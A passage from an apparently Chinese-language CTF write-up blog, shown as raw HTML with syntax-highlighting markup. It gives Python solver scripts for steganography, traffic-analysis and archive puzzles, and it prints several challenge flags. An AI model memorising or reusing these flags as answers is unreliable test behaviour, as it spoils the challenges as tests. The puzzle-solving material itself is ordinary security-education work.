class="token punctuation">:</span>    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>MAX<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> p<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">255</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token string">'0'</span>        <span class="token keyword">if</span> p<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token string">'1'</span>fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在转二进制后，发现是一个wav文件，保存下来，打开</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030919068.png" alt></p><p>发现每秒有十帧，共有八种不同的高度</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> wave<span class="token keyword">import</span> base64f <span class="token operator">=</span> wave<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"2.wav"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span>params<span class="token operator">=</span>f<span class="token punctuation">.</span>getparams<span class="token punctuation">(</span><span class="token punctuation">)</span>nchannels<span class="token punctuation">,</span> sampwidth<span class="token punctuation">,</span> framerate<span class="token punctuation">,</span> nframes <span class="token operator">=</span> params<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> <span class="token string">''</span>rflag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">319</span><span class="token punctuation">)</span><span class="token punctuation">:</span>strData<span class="token operator">=</span>f<span class="token punctuation">.</span>readframes<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">if</span> strData <span class="token operator">==</span> <span class="token string">b'\x01\xa0\x01\xa0\x01\xa0\x01\xa0\x01\xa0\x01\xa0\x01\xa0\x01\xa0\x01\xa0\x01\xa0'</span><span class="token punctuation">:</span>flag <span class="token operator">+=</span> <span class="token string">'0'</span><span class="token keyword">if</span> strData <span class="token operator">==</span> <span class="token string">b'\x01\xc0\x01\xc0\x01\xc0\x01\xc0\x01\xc0\x01\xc0\x01\xc0\x01\xc0\x01\xc0\x01\xc0'</span><span class="token punctuation">:</span>flag <span class="token operator">+=</span> <span class="token string">'1'</span><span class="token keyword">if</span> strData <span class="token operator">==</span> <span class="token string">b'\x01\xe0\x01\xe0\x01\xe0\x01\xe0\x01\xe0\x01\xe0\x01\xe0\x01\xe0\x01\xe0\x01\xe0'</span><span class="token punctuation">:</span>flag <span class="token operator">+=</span> <span class="token string">'2'</span><span class="token keyword">if</span> strData <span class="token operator">==</span> <span class="token string">b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</span><span class="token punctuation">:</span>flag <span class="token operator">+=</span> <span class="token string">'3'</span><span class="token keyword">if</span> strData <span class="token operator">==</span> <span class="token string">b'\xff\x1f\xff\x1f\xff\x1f\xff\x1f\xff\x1f\xff\x1f\xff\x1f\xff\x1f\xff\x1f\xff\x1f'</span><span class="token punctuation">:</span>flag <span class="token operator">+=</span> <span class="token string">'4'</span><span class="token keyword">if</span> strData <span class="token operator">==</span> <span class="token string">b'\xff?\xff?\xff?\xff?\xff?\xff?\xff?\xff?\xff?\xff?'</span><span class="token punctuation">:</span>flag <span class="token operator">+=</span> <span class="token string">'5'</span><span class="token keyword">if</span> strData <span class="token operator">==</span> <span class="token string">b'\xff_\xff_\xff_\xff_\xff_\xff_\xff_\xff_\xff_\xff_'</span><span class="token punctuation">:</span>flag <span class="token operator">+=</span> <span class="token string">'6'</span><span class="token keyword">if</span> strData <span class="token operator">==</span> <span class="token string">b'\xff\x7f\xff\x7f\xff\x7f\xff\x7f\xff\x7f\xff\x7f\xff\x7f\xff\x7f\xff\x7f\xff\x7f'</span><span class="token punctuation">:</span>flag <span class="token operator">+=</span> <span class="token string">'7'</span>flag <span class="token operator">+=</span> <span class="token string">'5'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>b <span class="token operator">=</span> flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>flag<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>flag<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span>c <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span>rflag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>rflag <span class="token operator">+=</span> <span class="token string">'======'</span>flag <span class="token operator">=</span> base64<span class="token punctuation">.</span>b32decode<span class="token punctuation">(</span>rflag<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="suctf2019protocol"><a class="markdownIt-Anchor" href="#suctf2019protocol"></a> [SUCTF2019]protocol</h3><p>USB流量导出</p><pre class="line-numbers language-none"><code class="language-none">tshark -r 1.pcapng -T fields -e usb.capdata | sed &#39;&#x2F;^\s*$&#x2F;d&#39; &gt; usbdata.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>什么都没有发现，然后检查流量包发现png</p><p>foremost分离得到</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030919069.png" alt></p><p>发现十五个字母图片后面有是个黑色图片，继续看流量包</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030919070.png" alt></p><p>发现数据第三个比特有规律变化，前十五个为图片顺序后面使黑色的顺序，对应得到</p><pre class="line-numbers language-none"><code class="language-none">04 03 02 01 00 09 08 07 06 05 0e 0d 0c 0b 0a06 07 0e 04 01 0d 00 02 0b 0904 03 02 01 00 09 08 07 06 05 0e 0d 0c 0b 0a01 0e 08 06 0d 0c 00 05 09 0b04 03 02 01 00 09 08 07 06 05 0e 0d 0c 0b 0a02 09 03 05 01 07 0d 0b 0e 0404 03 02 01 00 09 08 07 06 05 0e 0d 0c 0b 0a06 0d 0a 08 09 04 0b 03 0c 0204 03 02 01 00 09 08 07 06 05 0e 0d 0c 0b 0a# 将重复多余的删除就是得到04 03 02 01 00 09 08 07 06 05 0e 0d 0c 0b 0a06 07 0e 04 01 0d 00 02 0b 0901 0e 08 06 0d 0c 00 05 09 0b02 09 03 05 01 07 0d 0b 0e 0406 0d 0a 08 09 04 0b 03 0c 02suctf&#123;My_usb_pr0toco1_s0_w3ak&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="mrctf2020千层套路"><a class="markdownIt-Anchor" href="#mrctf2020千层套路"></a> [MRCTF2020]千层套路</h3><p>题目是一个压缩包套娃，密码是该文件的名字</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfile<span class="token keyword">import</span> osname <span class="token operator">=</span> <span class="token string">'0573'</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>name<span class="token operator">+</span><span class="token string">'.zip'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>path<span class="token operator">=</span><span class="token string">'.'</span><span class="token punctuation">,</span>pwd<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>name<span class="token operator">+</span><span class="token string">'.zip'</span><span class="token punctuation">)</span>    name <span class="token operator">=</span>  r<span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到qr.zip，打开后发现应该是一个图片</p><pre class="line-numbers language-none"><code class="language-none">(255, 255, 255)(255, 255, 255)(255, 255, 255)(255, 255, 255)(255, 255, 255)(255, 255, 255)(255, 255, 255)(255, 255, 255)(255, 255, 255)(255, 255, 255)(255, 255, 255)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>python得到</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">from</span> zlib <span class="token keyword">import</span><span class="token operator">*</span><span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'qr.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>i<span class="token operator">=</span><span class="token number">0</span>pic <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"RGB"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            color<span class="token operator">=</span><span class="token builtin">file</span><span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>            pic<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token builtin">eval</span><span class="token punctuation">(</span>color<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#eval函数可以直接得到元组</span>        pic<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'1.png'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现是一个二维码，解码得到flag</p><h3 id="一路到底"><a class="markdownIt-Anchor" href="#一路到底"></a> 一路到底</h3><p>题目给了许多txt文件。</p><p>最下面有一个start.txt，打开发现</p><pre class="line-numbers language-none"><code class="language-none">20555 : The next is a8242a234560a0d3cf121864ee34d7fb.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>前面数字hex转化后未504B，下一个则是0304，猜测是一个压缩包。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binascii<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> tqdmflag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">with</span> <span class="token builtin">open</span> <span class="token punctuation">(</span><span class="token string">'start.txt'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    text <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    nexxt <span class="token operator">=</span> text<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">36</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    data<span class="token operator">=</span><span class="token string">'&#123;:04x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>text<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    flag <span class="token operator">+=</span> data    <span class="token keyword">print</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">,</span> nexxt<span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">160000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>nexxt<span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                text <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>                nexxt <span class="token operator">=</span> text<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">36</span><span class="token punctuation">:</span><span class="token punctuation">]</span>                 data <span class="token operator">=</span> <span class="token string">'&#123;:04x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>text<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                flag <span class="token operator">+=</span> data        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'123.zip'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> dw<span class="token punctuation">:</span>    dw<span class="token punctuation">.</span>write<span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后破解密码。</p><p>得到一个png，其实是jpg格式，修改得到图片。</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030919071.jpg" alt></p><h3 id="key不在这里"><a class="markdownIt-Anchor" href="#key不在这里"></a> key不在这里</h3><p>给了一个二维码，解码得到</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;cn.bing.com&#x2F;search?q&#x3D;key%E4%B8%8D%E5%9C%A8%E8%BF%99%E9%87%8C&amp;m&#x3D;10210897103375566531005253102975053545155505050521025256555254995410298561015151985150375568&amp;qs&#x3D;n&amp;form&#x3D;QBRE&amp;sp&#x3D;-1&amp;sc&#x3D;0-38&amp;sk&#x3D;&amp;cvid&#x3D;2CE15329C18147CBA4C1CA97C8E1BB8C<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现中间有一串数字</p><pre class="line-numbers language-none"><code class="language-none">10210897103375566531005253102975053545155505050521025256555254995410298561015151985150375568<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>猜测是ascii码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parses <span class="token operator">=</span> <span class="token string">'10210897103375566531005253102975053545155505050521025256555254995410298561015151985150375568'</span>tem <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">127</span><span class="token punctuation">:</span>        tem <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        s <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        tem <span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        s<span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token comment"># print(tem)  flag%7B5d45fa256372224f48746c6fb8e33b32%7D</span>url <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>tem<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token comment"># flag&#123;5d45fa256372224f48746c6fb8e33b32&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ddctf2018第四扩展fs"><a class="markdownIt-Anchor" href="#ddctf2018第四扩展fs"></a> [DDCTF2018]第四扩展FS</h3><p>binwalk分析图片得到压缩包，再exif找到提示，打开压缩包，得到</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030919072.png" alt></p><p>看提示是词频分析</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> collections <span class="token keyword">import</span> Counter<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'file.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token keyword">as</span> f<span class="token punctuation">:</span>    s<span class="token operator">=</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>result <span class="token operator">=</span> Counter<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token comment">#print(result)</span>flag<span class="token operator">=</span><span class="token punctuation">[</span>key <span class="token keyword">for</span> key <span class="token punctuation">,</span> value <span class="token keyword">in</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>key<span class="token operator">=</span><span class="token keyword">lambda</span> k<span class="token punctuation">:</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>reverse <span class="token operator">=</span><span class="token boolean">True</span> <span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># DCTF&#123;huanwe1sik4o!&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ctf2019babyflash"><a class="markdownIt-Anchor" href="#ctf2019babyflash"></a> [*CTF2019]babyflash</h3><p>一个flash文件利用 jpexi进行分离得到 一个wav文件和一堆二维码部分</p><p>二维码进行组装</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">def</span> <span class="token function">aaa</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    image <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"frames/"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">".png"</span><span class="token punctuation">)</span>    a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">,</span>d <span class="token operator">=</span> image<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> adata<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">442</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> aaa<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>        data<span class="token operator">+=</span><span class="token string">'1'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        data<span class="token operator">+=</span><span class="token string">'0'</span>length <span class="token operator">=</span> <span class="token number">21</span>img <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>length <span class="token operator">*</span> <span class="token number">5</span><span class="token punctuation">,</span> length <span class="token operator">*</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> data<span class="token punctuation">[</span>x<span class="token operator">*</span>length<span class="token operator">+</span>y<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> xx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>x<span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">,</span> x<span class="token operator">*</span><span class="token number">5</span><span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> yy <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>y<span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">,</span> y<span class="token operator">*</span><span class="token number">5</span><span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    img<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span>xx<span class="token punctuation">,</span> yy<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> xx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>x<span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">,</span> x<span class="token operator">*</span><span class="token number">5</span><span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> yy <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>y<span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">,</span> y<span class="token operator">*</span><span class="token number">5</span><span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    img<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span>xx<span class="token punctuation">,</span> yy<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 保存新图像</span>img<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'flag.png'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>wav解开后得到flag</p><pre class="line-numbers language-none"><code class="language-none">*ctf&#123;half_flag_&amp;&amp;_the_rest&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="羊城杯-2020逃离东南亚"><a class="markdownIt-Anchor" href="#羊城杯-2020逃离东南亚"></a> [羊城杯 2020]逃离东南亚</h3><p>打开是三个压缩包，第一个没有密码，给了一个png图片，发现宽高有问题</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> binascii<span class="token keyword">import</span> structcrcbp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"img.png"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>  original_crc32 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>crcbp<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">:</span><span class="token number">33</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token comment">#打开图片</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> crcbp<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> \            struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'>i'</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token operator">+</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'>i'</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token operator">+</span>crcbp<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">]</span>        crc32 <span class="token operator">=</span> binascii<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>crc32 <span class="token operator">==</span> original_crc32<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#图片当前CRC</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'hex:'</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token 